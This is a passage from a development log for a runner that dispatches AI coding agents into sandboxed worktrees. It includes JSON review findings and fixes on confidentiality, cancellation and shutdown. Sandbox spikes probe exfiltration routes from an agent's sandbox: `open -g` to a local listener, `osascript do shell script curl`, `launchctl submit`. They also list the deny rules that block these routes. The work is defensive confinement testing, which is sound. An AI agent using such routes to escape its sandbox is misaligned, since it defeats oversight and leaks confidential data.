  "Unbuilt Phase 2/3 work (dispatch, redaction gate, reset generation, shared-state locking, terminal tabs) was reviewed only at plan level; private projects.yaml entries, real session stores and the scratchpad spike evidence were not inspected.",
  "DEGRADED_SAME_PROVIDER: preferred reviewer codex was unavailable; claude reviewed in a fresh fallback session without cross-provider independence."
 ]
}
```

### Host dispositions (all 9 accepted)
- I4-01 (high) reproduced: under the allow-default profile, a sandboxed `open -g http://127.0.0.1:<port>` reached a local listener (exfiltration route); `launchctl submit` and `osascript do shell script` did not escape. Fixed with a deny-list (lsopen, appleevent-send, LaunchServices/AppleEvents mach-lookup) rather than deny-default; the ceiling is documented. The test probes all three routes. New spike (d2) for the agents' own sandboxes: Claude passed (open denied, 0 hits); Codex is pending its quota reset.
- I4-02: diff-tree --root; test with an orphan root commit.
- I4-03: the fingerprint now covers symbolic-ref HEAD, shared refs (excluding agent/* and remotes) and ls-files -v flags; tests for a branch switch, a stash drop and skip-worktree.
- I4-04: the binding (the "ready" marker) is written after the seeds; any failure (BaseException) removes the worktree; OSError becomes ProjectError; reuse re-checks seeds. Tests: interrupted creation, a missing seed on reuse.
- I4-05: verify's writable roots narrowed to the worktree plus its own .git/worktrees/<id>; the plan now orders the closing fingerprint after commit, seed check and verify (Phase 2 boxes added).
- I4-06: verify waits on proc.wait() with a reader thread; a background child holding stdout no longer turns a pass into a timeout (test).
- I4-07: per-entry Exception isolation in load_registry; string checks for titles and ids; shlex.quote on resume ids (tests).
- I4-08: _git_argv injects --no-ext-diff --no-textconv into every diff (test).
- I4-09: lock and binding sidecars moved to <key>/.meta/ (test with ticket "T-1.json").
- pytest: 220 passed. The next inspection must be cross-provider (Codex) once its quota resets, to restore full assurance for Phases 0–1.

## Build — Decision 11 reset generation (2026-10-14)
- runner/reset_gen.py: per-issue generation (`state/reset_generations.json`, locked via state_io) plus a per-issue RLock.
- **Deviation from the plan text:** the generation lives in its own file, not in `task_state.json`. That file is keyed by skill, and consumers iterate its keys as skill names. The same locked-transaction rule applies.
- The reset key is the tracker issue id when there is one, else the task id. Both tracker PATCH routes (via `_tracker_reset_route`) and `PATCH /api/runs/<id>/status` todo|rework bump it under the issue lock.
- Retry, Linear dispatch and their timeout/error paths record `reset_gen`. `_get_task_agent_lock` trusts only current-generation records. Completion pushes carry their launch generation, and `push_state` and `_push_sync` re-check it inside the issue lock. The run_state_change emit is skipped for stale runs; the history record is still written.
- tests/test_reset_gen.py (8 tests): the real reset route, then retry, for claude/codex/dsh; agent change; reset mid-run (ticket stays Todo, no review event, new session not resumed); restore of a pre-reset run; a failed fresh launch; an in-flight push racing a reset. pytest: 228 passed.

## Build — Phase 2 dispatch (2026-10-14)
- runner/project_runs.py: label → project key; binding fields; `agent_cli` per the spiked flags (confidential Claude/Codex sandboxed, dsh refused, non-confidential Codex `--approve-for-me`, a CONFIDENTIAL_SANDBOX_VERIFIED kill switch); the dispatch prompt; `tracker_comment` gate (fixed template for confidential; feedback not posted); EventRing + `run_agent` (own process group, line-by-line `run_event`, group reaped on every path); `post_run` (runner commit for Codex, seed check, verify, shortstat, then the closing fingerprint last).
- app.py `_run_project_ticket`: the one launch helper for Linear dispatch and retry/rework. It holds the ticket lock throughout, reuses the persisted binding on retry (`reuse_only`, fails closed if the worktree is missing), skips post-run after a user cancel, writes additive record fields (binding, verify, verify_badge, shortstat, main_checkout_changed, seed_committed, runner_commit), and gates comments and pushes by generation. Linear's manual feedback-comment route refuses confidential projects (403).
- Startup guard (4a): `check_record_locations` in main(); the real config passes.
- UI: verify badge on cards; failing project runs sort first in In Review (checked in headless Chrome).
- **Open deviation (needs user decision):** `/run` free prompts carry no ticket id, so they keep the runner-root launch; only tickets get project runs.
- tests/test_project_dispatch.py (26 tests) covers the argv policy, the comment gate, the guard, streaming, and end-to-end runs with a fake agent (binding, runner commit, background-writer reaping, cancel, main-checkout flag, confidential comment, retry binding, missing worktree, concurrent launch, cleanup while locked, verify roots, closing fingerprint). One earlier run failed once; 9 consecutive reruns passed (likely load during a runner restart). pytest: 254 passed.

## Build — Phase 3 terminal tabs (2026-10-14)
- runner/modules/pty rewritten. Server-owned Terminal registry (term_id, kind, project, cwd, 256 KB scrollback, cap AGENTIC_OS_MAX_TERMINALS=8).
  - Events: term_list/open/attach/input/resize/close; connect opens nothing.
  - One lock is shared by the reader (append+emit) and attach (join+snapshot).
  - Close kills every process group in the shell's session (ps + os.getsid); a failed enumeration leaves the tab flagged cleanup_failed.
  - A bound-worktree tab holds the ticket lock via an ExitStack.
  - `interactive_resume_argv` goes through `project_runs.agent_cli` (confidential sandboxed; dsh/none → no button).
  - Handoff logging carries project_key. SIGTERM/atexit close every terminal.
- app.py: `/api/runs/<id>/events` (event ring + resume eligibility); project runs record interactive_tab_open and use the badge variant.
- index.html: tab strip, one xterm per tab, HIDE keeps processes, × confirms then kills, + SHELL, "Open terminal" on project headers, "Resume in tab" on session rows and finished run tabs, "▤ run tab" on project cards. A first visit shows a hint instead of auto-opening (MPD-29).
- tests/test_terminals.py (11 tests, real PTYs): independent cwd/output/input; reload reattach without a new PTY; no loss or duplication during attach (400 lines); close kills background, pipeline and orphaned groups; 9th open refused; tab owns the ticket; resume argv policy; scrollback never on disk; run tab writes nothing; interactive_tab_open detection; events endpoint. Known: Python warns that forkpty runs in a multi-threaded process (as before); the child only chdirs and execs.
- Live check (headless Chrome, restarted runner) passed; see the plan checkbox. pytest: 265 passed.

## Build inspection 5 — Codex, cross-provider (2026-10-15)
- Fresh Codex session (codex-cli 0.162.0, CLI default model), base a8ab382, covering Phases 0–3 plus Decision 11 and 4b. Result: `/private/tmp/claude-501/-Users-yanghu-Documents-AI-Workspace-prototypes-agentic-os/aff7570e-fb57-4e68-b06f-89245cb7eb36/scratchpad/claudex/i5/claudex-kuijg7so/result.json` (session 01a13ddc-5c69-70b3-82ba-7785fe548bfb, 368 s).
- Verdict: **REVISE**, 14 findings.

```json
{
 "verdict": "REVISE",
 "summary": "Material defects remain in confidential-data handling, binding preservation, tracker reset ordering, process supervision, and terminal resume isolation.",
 "findings": [
  {
   "id": "MPD-I5-01",
   "severity": "high",
   "path": "runner/app.py:3010",
   "evidence": "Cancellation writes a replacement record without project binding, confidentiality, agent, task ancestry, or reset generation. Stall detection does the same in runner/modules/stall_detection/__init__.py:59. Retrying that authoritative record bypasses the project branch at app.py:3099 and launches at ROOT through the legacy bypass-permissions path. Confidential prompts and feedback can then enter ordinary tracker comments.",
   "fix": "Persist the binding before launching and preserve it, task ancestry, agent, and generation in every cancellation/stall record. Resolve binding from task history before permitting any legacy fallback."
  },
  {
   "id": "MPD-I5-02",
   "severity": "high",
   "path": "runner/app.py:2495",
   "evidence": "The error path starts with a binding lacking confidential=true and sets confidentiality only after registry lookup succeeds. If a previously confidential project's seed disappears or its registry entry becomes invalid, lookup fails and tracker_comment invokes the raw fallback at lines 2555\u20132557. A normal retry can consequently publish its original confidential prompt and previous output embedded in the retry prompt.",
   "fix": "Carry the persisted confidentiality policy into the helper before registry access. For an unresolved project binding, suppress comments or use a fixed local-error template; never select raw fallback because lookup failed."
  },
  {
   "id": "MPD-I5-03",
   "severity": "high",
   "path": "runner/modules/linear/__init__.py:565",
   "evidence": "Every tracker dispatch derives project_key from current labels and creates a new task_id, without consulting earlier bindings. After a bound ticket is reset to Todo, removing its project label and starting it again routes it through the runner-root legacy launcher; changing the label routes it to another project. _is_confidential_issue likewise permits feedback after a confidential ticket's project label is removed.",
   "fix": "Resolve an issue's durable binding before considering labels, including on tracker redispatch and feedback routes. Use labels only for genuinely unbound issues, and fail closed when an existing binding cannot be recovered."
  },
  {
   "id": "MPD-I5-04",
   "severity": "high",
   "path": "runner/app.py:3553",
   "evidence": "The record-location guard runs only at startup and receives a registry with invalid entries silently omitted. Dispatch reloads the registry on every run. Start with an external RUN_LOG_PATH and no valid confidential entry, then add or repair a confidential entry: its next run is accepted and writes the full payload externally without repeating the guard.",
   "fix": "Validate record locations before enabling any newly loaded confidential project, or freeze dispatch to a startup-validated registry. Startup must also account for confidentiality declared in entries that fail operational validation."
  },
  {
   "id": "MPD-I5-05",
   "severity": "medium",
   "path": "runner/modules/linear/__init__.py:813",
   "evidence": "Background Linear issue creation still calls LocalTracker._load_raw and _save_raw, both removed by this change. After the remote issue is created and its alias recorded, _load_raw raises AttributeError. Placeholder replacement and the id_map event never happen, leaving a local placeholder alongside the real remote issue.",
   "fix": "Convert placeholder replacement to local.raw_transaction(), preserving concurrent updates and publishing cache/alias migration only after the replacement succeeds."
  },
  {
   "id": "MPD-I5-06",
   "severity": "medium",
   "path": "runner/modules/linear/__init__.py:1110",
   "evidence": "_linear_sync_patch changes tracker state and publishes cache/events without the issue lock or a generation check. A delayed In Progress sync can therefore land after a Todo reset. Separately, launch-time push_state calls at line 570 and app.py:3102 omit gen, so their queued _push_sync operations remain unconditional even after reset.",
   "fix": "Capture and pass the launch generation to every queued state mutation. Serialize _linear_sync_patch and other tracker writers under issue_lock, checking generation before network writes and cache/event publication."
  },
  {
   "id": "MPD-I5-07",
   "severity": "medium",
   "path": "runner/project_runs.py:217",
   "evidence": "The new stdout reader emits run_event but never refreshes _running_jobs[run_id].last_progress_at, initialized once at app.py:2500. The enabled stall detector kills jobs after 300 seconds without that timestamp changing. Thus an actively streaming project run lasting five minutes is marked stalled and terminated despite the 1800-second agent timeout.",
   "fix": "Provide a progress callback that updates the job timestamp for valid agent activity. Track the verify phase separately so its configured timeout is respected."
  },
  {
   "id": "MPD-I5-08",
   "severity": "medium",
   "path": "runner/modules/pty/__init__.py:290",
   "evidence": "Ticket locking depends on the browser supplying ticket. Session-row Resume in tab sends only agent, session id, project key, and cwd (index.html:1060). For sessions in owned worktrees, open_terminal accepts cwd at line 305 without acquiring the ticket lock. Dispatch, verification, or cleanup can then run concurrently with that interactive agent.",
   "fix": "Resolve and validate session cwd server-side. When it belongs to an owned worktree, derive the ticket and acquire its lock regardless of the submitted ticket field; refuse concurrent resumes and active runs."
  },
  {
   "id": "MPD-I5-09",
   "severity": "medium",
   "path": "runner/app.py:2525",
   "evidence": "The agent handle is removed before post_run starts verification, and cancellation is checked only before post_run. Cancel during a long verifier: DELETE reports success and writes cancelled, but finds no process to terminate. Verification continues, and the helper subsequently appends review and pushes In Review, overwriting the cancellation.",
   "fix": "Supervise agent, Git mutation, and verifier processes through one cancellable run context. Keep cancellation authoritative through final logging, terminate and reap the current phase, and suppress subsequent completion effects."
  },
  {
   "id": "MPD-I5-10",
   "severity": "medium",
   "path": "runner/project_runs.py:252",
   "evidence": "Runner-side staging and commit precede the post-agent branch validation performed inside run_verify. If a non-confidential Codex run switches to another unused local branch through an approved escalation, runner_commit commits its changes onto that branch first. Verification only then rejects the binding, after the unintended branch has already been mutated.",
   "fix": "Validate live repository ownership, branch, and persisted binding immediately before runner-owned staging or commit. Refuse mutation on any mismatch and still record the closing main-checkout fingerprint on failure."
  },
  {
   "id": "MPD-I5-11",
   "severity": "medium",
   "path": "runner/project_runs.py:255",
   "evidence": "For Claude and dsh, no check ensures the agent actually committed its changes. An agent can exit successfully with an edited tracked file, verification can pass against that dirty worktree, and shortstat against base..HEAD can report no changes. The review card is green although manually merging agent/<id> omits the verified implementation.",
   "fix": "Before reporting a passing review, require all intended non-seed changes to be committed on the bound branch, or explicitly fail the badge with an uncommitted-changes diagnostic while preserving the files."
  },
  {
   "id": "MPD-I5-12",
   "severity": "medium",
   "path": "runner/app.py:3562",
   "evidence": "Shutdown registers cleanup only for terminal tabs. Project agents and verifiers run in separate sessions from daemon worker threads. On server SIGTERM, sys.exit ends the server without running those workers' finally blocks; their subprocesses can survive while the server-held ticket locks disappear. A restarted runner can then launch another process in the same worktree.",
   "fix": "Add coordinated shutdown for all project-run phases: stop accepting launches, cancel active contexts, terminate and reap their process groups, and wait for workers before releasing ownership and exiting."
  },
  {
   "id": "MPD-I5-13",
   "severity": "medium",
   "path": "runner/modules/pty/__init__.py:244",
   "evidence": "Non-confidential resumes return bare claude/codex commands instead of using the shared policy builder. In particular, Codex loses the required --approve-for-me mode and --add-dir configuration, inheriting the user's potentially different approval/sandbox defaults. Clicking Resume therefore changes the dispatch policy despite Decision 10 requiring the same builder.",
   "fix": "Implement an explicit interactive mode in the shared policy builder for every supported backend. Preserve the required policy flags and hide resume when a supported interactive form is unavailable."
  },
  {
   "id": "MPD-I5-14",
   "severity": "medium",
   "path": "runner/project_runs.py:255",
   "evidence": "The committed-seed scan runs before verification. Non-confidential verification executes agent-editable code without a sandbox and can commit a seed onto agent/<id>, then exit zero. The saved seed_committed result remains empty; the closing fingerprint excludes agent/* refs, so this run can receive a passing badge despite the seed now being committed.",
   "fix": "Run the final seed-history scan and binding validation after verification and every other repository-mutating step, immediately before recording the review result."
  }
 ],
 "coverage": [
  "Reviewed all manifest changes, including the deleted migration script; all 23 present-file SHA256 values matched, including the plan, and the changed-file list matched the supplied base.",
  "Inspected registry validation, worktree ownership and binding metadata, seeding, Git hardening, fingerprints, runner commits, verification, session readers, and their test source.",
  "Traced dispatch, retry, reset, restore, cancellation, completion, tracker synchronization, issue creation, feedback, stall detection, terminal resume, and shutdown.",
  "Inspected shared-state writers in app.py, run_skill.py, LocalTracker, Linear cache synchronization, and PTY handoffs.",
  "Reviewed browser request guards, upload headers, fetch/Socket.IO integration, dashboard changes, and relevant SPEC.md lifecycle and concurrency requirements."
 ],
 "limitations": [
  "Static review only: no files edited, tests executed, runtime/browser probes performed, or work delegated.",
  "Private registry entries, project repositories, real session stores, and sandbox spike artifacts were not inspected.",
  "Reported test results, sandbox behavior, pilot baselines, and browser checks were not independently reproduced.",
  "The plan's pending Codex sandbox probe, real-ticket dogfood, session-picker comparisons, and /run scope decision remain unverified."
 ]
}
```

### Host dispositions (all 14 accepted, 2026-10-15)
- I5-01: project-run cancel/stall/shutdown now only flag the job (`_signal_project_run`); the launch helper writes every record with binding, agent, task ancestry and generation. Retry resolves `_durable_binding(issue, task)` from run history (first bound record names the project; confidentiality sticky) before any legacy path.
- I5-02: the helper starts with the persisted confidentiality (None = unknown); `tracker_comment` treats unknown on a project binding as confidential. `confidential` can only strengthen.
- I5-03: `_dispatch_issue` and `_is_confidential_issue` consult the durable binding before labels; labels only bind unbound issues.
- I5-04: `record_location_problem` is checked on every confidential (or unknown) launch before anything runs; a refused or unsafe record keeps no prompt/output text. Startup check unchanged; an invalid registry entry cannot launch, and its error records now go through the same guard.
- I5-05: placeholder swap via `local.raw_transaction()`.
- I5-06: `_linear_sync_patch` runs under the issue lock and drops a `state_name` queued under an older generation (title/description edits still land); launch-time `push_state(running)` calls carry the launch generation.
- I5-07: the run_agent emit callback refreshes `last_progress_at`; the stall check (now `check_once`) skips project jobs in the post-run phase (bounded by git/verify timeouts).
- I5-08: Resume in tab derives the ticket from the session cwd when it is under the project's worktree root (taking the lock, `load_binding`), and refuses cwds outside the project path and its worktrees.
- I5-09: cancel SIGTERMs the current phase's group (agent or verify via `run_verify(on_start=)`); `post_run(stopped=)` skips verify after a cancel; a cancelled run gets no run comment, and its record is `cancelled`.
- I5-10: `runner_commit` calls `load_binding(ticket_from_worktree(...))` first; `post_run` catches ProjectError as `post_run_error` and still records the closing fingerprint.
- I5-11: `projects.uncommitted()` after the runner commit; non-empty => badge `uncommitted changes` (record keeps the list).
- I5-12: `_stop_project_runs` registered at exit (runs before terminal close): sets `_SHUTTING_DOWN`, kills and reaps every in-flight project process group. Ponytail: the record of a run killed at shutdown may not be written (daemon worker); the processes are gone before the locks drop.
- I5-13: `interactive_resume_argv` uses `agent_cli` for every project (root sessions stay bare).
- I5-14: binding re-check and `committed_seeds` moved after verify.
- Tests: 14 new regression tests (test_project_dispatch, test_reset_gen, test_terminals). pytest: 279 passed.

## Spike (d2), Codex half (2026-10-15)
- Confidential Codex argv (`codex exec --sandbox workspace-write`, network off, `approval_policy="never"`, writable_roots=[]) in a scratch repo, local listener on 127.0.0.1:8598.
- From the agent shell: `open -g URL` exit 1 (kLSExecutableIncorrectFormat); `osascript` probes (`do shell script curl`, `open location`, `tell application "Terminal" to do script`) exit 1, OSA components fail to load / XPC connection invalid; `curl` exit 7. Listener hits: 0.
- Control (unsandboxed): the `do shell script` probe file reached the listener; the `open location` file compiles. So the failures are the sandbox, not the probes. PASS.

## Build inspection 6 — fresh Codex reinspection of the I5 fixes (2026-10-15)
- Fresh Codex session 01a13e89-d2ae-7432-a24b-ae964f6fb715, base 5781a1c, feedback = I5 findings + dispositions, proof `.venv/bin/python -m pytest tests/`. Result `/private/tmp/claude-501/-Users-yanghu-Documents-AI-Workspace-prototypes-agentic-os/aff7570e-fb57-4e68-b06f-89245cb7eb36/scratchpad/claudex/i6/claudex-a2dst43k/result.json`.
- Runner status `failed`: "Plan changed during the run" (the host committed the spike-d2 plan edit, 664e57d, while it ran). The response is complete and its findings are treated as valid; it cannot approve.
- Verdict: **REVISE**, 13 findings.

```json
{
 "verdict": "REVISE",
 "summary": "The fixes address several original failures, but material gaps remain in confidentiality enforcement, durable binding, cancellation, shutdown, verification, and shared-state ordering.",
 "findings": [
  {
   "id": "MPD-I6-01",
   "severity": "high",
   "path": "runner/app.py:2587",
   "evidence": "The first binding is still written to RUN_LOG only after execution, at line 2635. Worktree metadata contains no tracker issue id or confidentiality. During a ticket's first confidential run, removing its project label makes _durable_binding return None; _is_confidential_issue then permits raw feedback comments. Shutdown before completion can permanently lose the issue-to-project association.",
   "fix": "Persist the complete issue/task binding and effective confidentiality before starting the agent. Make dispatch, retry, feedback and resume consult that durable record, including while the first run is active."
  },
  {
   "id": "MPD-I6-02",
   "severity": "high",
   "path": "runner/app.py:2579",
   "evidence": "Sticky confidentiality updates only binding['confidential']. The Project object still reflects the current registry. After a previously confidential project's registry flag becomes false, retry retains confidential=true in its record but _project_cmd selects bypassPermissions or --approve-for-me, permits dsh, and post_run runs verification without confinement. Terminal resume also uses only current registry policy.",
   "fix": "Build one effective project policy using persisted and current confidentiality, with true remaining authoritative. Apply it to backend eligibility, agent argv, Git confinement, verification and interactive resume."
  },
  {
   "id": "MPD-I6-03",
   "severity": "high",
   "path": "runner/app.py:3193",
   "evidence": "Retry posts Human Feedback using the historical binding before resolving current registry policy. If a project previously ran with confidential=false and is subsequently marked confidential=true, a retry containing private feedback or attachment names posts them verbatim. The launch helper strengthens confidentiality only afterward.",
   "fix": "Resolve effective confidentiality before posting any retry feedback. Treat registry lookup failure as unknown and suppress feedback until policy is established."
  },
  {
   "id": "MPD-I6-04",
   "severity": "high",
   "path": "runner/projects.py:662",
   "evidence": "The new location check protects project launches, but other writers remain exposed after registry changes. Start with an external RUN_LOG_PATH and no confidential projects, then add a confidential project. PTY open_terminal reloads and accepts that project without checking record locations; skill_selected followed by term_input reaches _record_pending_handoff, which writes the full command through _write_run_log to the external log. Invalid confidential entries are also still omitted from the startup guard.",
   "fix": "Validate declared confidentiality before accepting a registry at startup or reload, independently of operational entry validation. Enforce the location invariant for every confidential writer, including PTY handoffs."
  },
  {
   "id": "MPD-I6-05",
   "severity": "high",
   "path": "runner/app.py:2635",
   "evidence": "The unsafe-location branch withholds prompt and output but still writes error unchanged. projects.load_registry embeds YAML parser diagnostics in ProjectError, including offending source lines. A malformed registry line containing a private path or literal secret can therefore be copied into an external RUN_LOG even though the refused launch is supposedly sanitized.",
   "fix": "When record locations are unsafe, persist only fixed diagnostic codes and trusted fields. Keep raw exception text and other private metadata out of every unsafe destination."
  },
  {
   "id": "MPD-I6-06",
   "severity": "medium",
   "path": "runner/app.py:2645",
   "evidence": "Cancelled and stalled project runs still unconditionally call _push_linear_state_async(..., 'review'). Cancellation during verification consequently writes a cancelled run record but moves its tracker ticket to In Review. The new regression test checks comments and records but never checks its captured pushes.",
   "fix": "Suppress the review push when cancellation or stall is authoritative, and verify that no completion tracker mutation follows cancellation."
  },
  {
   "id": "MPD-I6-07",
   "severity": "medium",
   "path": "runner/app.py:2529",
   "evidence": "_signal_project_run sends SIGTERM once and returns success. run_agent continues waiting for AI_RUN_TIMEOUT_S, and run_verify waits for verify_timeout_s; neither observes the cancellation flag while waiting. A process that ignores SIGTERM remains active until that timeout, holding the ticket lock and potentially continuing writes or provider usage. Stall detection stops retrying because cancelled is already set.",
   "fix": "Give cancellation its own bounded termination sequence: SIGTERM, SIGKILL after five seconds, then reap. Make both agent and verifier waits respond to the cancellation event."
  },
  {
   "id": "MPD-I6-08",
   "severity": "medium",
   "path": "runner/app.py:2511",
   "evidence": "Shutdown inspects only _running_procs and never waits for project workers. Git subprocesses started by projects._run_bounded\u2014including worktree creation, runner commits and closing checks\u2014run in separate sessions without registration there. SIGTERM during one of these phases can therefore end the server and release ticket locks while the Git process survives. A process starting just after the shutdown snapshot is likewise only sent SIGTERM by _track.",
   "fix": "Synchronize shutdown with process creation, supervise every project subprocess including Git, and wait for workers to terminate and finalize before exiting or releasing ownership."
  },
  {
   "id": "MPD-I6-09",
   "severity": "medium",
   "path": "runner/project_runs.py:262",
   "evidence": "The dirty-worktree check runs before verification and is never repeated. A verify command that regenerates a tracked file and then successfully tests it leaves dirty changes while the saved dirty list remains empty. The badge becomes pass even though merging agent/<id> omits part of the verified result.",
   "fix": "Repeat the uncommitted-change check after verification and all repository-mutating steps. Derive the final badge from the final worktree state."
  },
  {
   "id": "MPD-I6-10",
   "severity": "medium",
   "path": "runner/modules/linear/__init__.py:581",
   "evidence": "Redispatch now finds an earlier binding, but does not pass reuse_only=True. After a bound worktree and branch are cleaned up, resetting and starting the ticket calls create_worktree and silently creates a replacement from current HEAD. _durable_binding also discards the persisted worktree, branch and base_sha, preventing comparison with the original binding.",
   "fix": "Distinguish first binding from redispatch. Require the original owned worktree for bound issues and compare its complete persisted binding; fail closed when it is missing or replaced."
  },
  {
   "id": "MPD-I6-11",
   "severity": "medium",
   "path": "runner/modules/linear/__init__.py:429",
   "evidence": "The polling writer bypasses the issue locks added around synchronization. It can build an In Progress snapshot, pause before cache replacement, then overwrite a Todo reset that completed meanwhile. _sync_cache_to_local subsequently persists the stale state to tasks.json. The late guard protects In Review only, and overrides already applied during snapshot construction do not protect this interleaving.",
   "fix": "Capture generation or revision information for polled issues and revalidate under each issue lock before publishing cache entries, persisting them or emitting updates."
  },
  {
   "id": "MPD-I6-12",
   "severity": "medium",
   "path": "runner/modules/linear/__init__.py:823",
   "evidence": "The repaired placeholder swap locks the file transaction but discards the current placeholder wholesale. While remote create_issue is pending, a local PATCH can update its title, description or state. The transaction then pops that updated record and installs the original remote response, losing those completed edits; overrides also remain keyed by the removed local id.",
   "fix": "Merge changes made since creation into the replacement, migrate local overrides and other issue-owned state to the real id, and synchronize pending edits to Linear before declaring the replacement complete."
  },
  {
   "id": "MPD-I6-13",
   "severity": "medium",
   "path": "runner/app.py:2603",
   "evidence": "Cancellation during the agent phase skips post_run entirely, which is the only place taking the closing main-checkout fingerprint. If an agent changes the main checkout and is then cancelled or stalled, its final record has no main_checkout_changed result or warning badge. The detector therefore misses precisely these non-success exits.",
   "fix": "Separate mandatory closing safety checks from commit and verification work. After reaping the agent, capture the closing fingerprint on cancellation, stall and error paths while skipping further implementation work."
  }
 ],
 "coverage": [
  "Verified all 11 manifest file hashes, including the supplied plan hash; the changed-file list matches base 5781a1c and HEAD is 8171bfd.",
  "Inspected the changes and relevant surrounding implementation in every manifest file, including all three changed test files and the inspection-5 dispositions.",
  "Rechecked all 14 I5 findings. Source supports the targeted progress refresh, terminal ticket derivation, pre-commit branch validation, shared resume argv and post-verify seed scan fixes (I5-07/08/10/13/14).",
  "Confirmed the true/unknown confidential comment gate and removed-method placeholder failure were corrected; remaining related defects are listed above.",
  "Traced dispatch, retry, feedback, cancellation, stall detection, shutdown, verification and resume callers, plus shared-state writers in LocalTracker, run_skill.py, reset_gen.py, state_io.py, Linear polling and PTY handoffs.",
  "Consulted relevant SPEC.md lifecycle and concurrency requirements and dashboard callers for terminal resume and run completion."
 ],
 "limitations": [
  "Static review only: no files edited, tests executed, runtime probes performed or work delegated. Reported test results were not independently verified.",
  "Private registry contents, project repositories, real session stores and sandbox spike artifacts were not inspected.",
  "Earlier phases were reviewed only where they interact with these fixes. Pending sandbox probes, dogfood checks and session-picker comparisons remain unverified."
 ]
}
```

### Host dispositions (12 accepted, 1 rejected, 2026-10-15)
- I6-01 accepted: `state/issue_bindings.json` (locked json_transaction) keyed `issue:`, `task:` and `ticket:<key>/<id>`; written right after the registry lookup, before the worktree and agent, then filled with worktree/branch/base_sha. First binding wins; confidentiality merges sticky. `_durable_binding` reads it (the run-log scan is gone; retry still falls back to a legacy record's own fields).
- I6-02 accepted: the helper merges the stored flag itself and replaces the Project with `confidential=True` for the whole run (argv, git confinement, verify, comments). A Resume tab in a bound worktree applies the ticket's stored flag. Main-path Resume of a session (no ticket) follows the current registry — sessions are not tickets.
- I6-03 accepted: retry computes `_effective_confidential` (stored ∨ current registry; lookup failure = unknown) before posting feedback.
- I6-04 accepted: startup uses `declares_confidential()` on the raw YAML (invalid entries count; unreadable = declared). PTY: a confidential tab is refused when records are unsafe; handoffs re-check the registry and withhold the command when unsafe.
- I6-05 accepted: an unsafe confidential record keeps `withheld (<status>): …` as its error, no exception text.
- I6-06 rejected: parking a cancelled ticket In Review is the existing cancel-route behaviour. Linear has no cancelled state; nothing re-dispatches a ticket left In Progress, so it would show a run that is not running. The test now asserts the push.
- I6-07 accepted: `_terminate_group` = SIGTERM, SIGKILL after 5 s while the leader is unreaped; also used when a phase starts after a cancel.
- I6-08 accepted: `projects.spawn/reap/stop_all` register every project process (git via `_run_bounded`, agent, verify); `stop_all` sets STOPPING under the registry lock (nothing starts after the snapshot) and reaps all; shutdown then waits up to 10 s for workers to write their records.
- I6-09 accepted: `uncommitted()` repeats after verify; the badge uses the union.
- I6-10 accepted: redispatch passes `reuse_only` once the binding has a worktree; a reused worktree whose base differs from the stored base is refused. Escape hatch named in the error.
- I6-11 accepted: the poller snapshots generations before the fetch and publishes under all polled issues' locks, keeping the current entry of any issue reset meanwhile.
- I6-12 accepted in part: local title/description/state/agent edits made during the pending create win in the swap, and `_local_overrides` migrate to the real id. Pushing those edits to Linear is a pre-existing gap of the local-first create path, outside this plan.
- I6-13 accepted: a cancelled/stalled run reaps the agent, then takes the closing fingerprint (badge `main checkout changed` when it differs).
- Tests: 12 new; pytest 291 passed.

## Build inspection 7 — fresh Codex reinspection of the I6 fixes (2026-10-15)
- Fresh Codex session 01a13e98-d4b1-7df3-bfcd-86a50ddecce6, base 8171bfd, cross-provider, 264 s. Result `/private/tmp/claude-501/-Users-yanghu-Documents-AI-Workspace-prototypes-agentic-os/aff7570e-fb57-4e68-b06f-89245cb7eb36/scratchpad/claudex/i7/claudex-35f5stxg/result.json`.
- Verdict: **REVISE**, 7 findings.

```json
{
 "verdict": "REVISE",
 "summary": "Several I6 fixes are supported by the source, but material gaps remain in binding compatibility, confidentiality, shutdown finalization, polling and placeholder preservation.",
 "findings": [
  {
   "id": "MPD-I7-01",
   "severity": "high",
   "path": "runner/app.py:2508",
   "evidence": "_durable_binding now reads only issue_bindings.json, with no migration from existing run records. After upgrading, an already-confidential ticket whose project label was removed has no binding in the new store. Linear redispatch consequently takes the runner-root path, and _is_confidential_issue can allow raw feedback. Retry's fallback protects only an original record containing project_key; historical cancel/stall records without that field also lose their association.",
   "fix": "Migrate historical bindings before accepting requests, or retain a run-history fallback that persists the recovered complete binding and sticky confidentiality. Cover redispatch, feedback, terminal resume and retries of records lacking binding fields."
  },
  {
   "id": "MPD-I7-02",
   "severity": "high",
   "path": "runner/projects.py:906",
   "evidence": "Sticky confidentiality is applied in dashboard dispatch and PTY resume, but the CLI verify path constructs its Project solely from the current registry. After a confidential ticket is persisted and the registry flag becomes false, projects.py verify executes that ticket's agent-edited verification code without sandbox-exec. The same ticket remains confidential through dashboard dispatch, so the promised effective policy depends on the entrypoint.",
   "fix": "Move durable binding and effective-policy resolution into shared code usable by both the dashboard and projects.py. Resolve the ticket's sticky confidentiality before CLI verification and associated Git operations."
  },
  {
   "id": "MPD-I7-03",
   "severity": "medium",
   "path": "runner/app.py:2686",
   "evidence": "Shutdown calls projects.stop_all(), which permanently refuses every subsequent projects.spawn(). A confidential worker then reaches _records_unsafe outside its exception handler; that check invokes Git through spawn and raises ProjectError. Its final run record is never written. The worker has already removed itself from _running_jobs, so the shutdown wait can finish before finalization as well. The shutdown regression test uses non-confidential runs and replaces record_location_problem with a stub.",
   "fix": "Make confidential finalization independent of prohibited subprocess creation, treating an unavailable location check as unsafe and writing a fixed redacted record. Track worker completion through logging, and represent unavailable closing checks explicitly."
  },
  {
   "id": "MPD-I7-04",
   "severity": "medium",
   "path": "runner/modules/linear/__init__.py:432",
   "evidence": "The poller locks and revalidates only IDs returned in new_cache. A cached Done ticket is absent from the active-state fetch and is copied into terminal_issues before lock acquisition. If the user resets it to Todo before publication, the poller clears the current cache and restores the stale Done snapshot at line 451, then persists it through _sync_cache_to_local. Its generation change is never examined.",
   "fix": "Include existing and terminal-snapshot issue IDs in the publication lock set. Reconcile every generation changed during the fetch against the current cache before replacing or persisting entries."
  },
  {
   "id": "MPD-I7-05",
   "severity": "medium",
   "path": "runner/modules/linear/__init__.py:839",
   "evidence": "Pending-create edits are merged locally but never synchronized to the real Linear issue. The dashboard sends edits using the placeholder ID; that remote PATCH cannot update the not-yet-created real issue. After replacement, the next poll\u2014or a poll after the migrated 60-second override expires\u2014restores Linear's original title, description, state and agent, overwriting the merged local values. The new test stops immediately after replacement and therefore does not establish durable preservation.",
   "fix": "Persist pending edits across the ID swap and synchronize them using the real ID. Retain their local authority until remote acknowledgement, then verify preservation through a subsequent poll."
  },
  {
   "id": "MPD-I7-06",
   "severity": "medium",
   "path": "runner/app.py:2632",
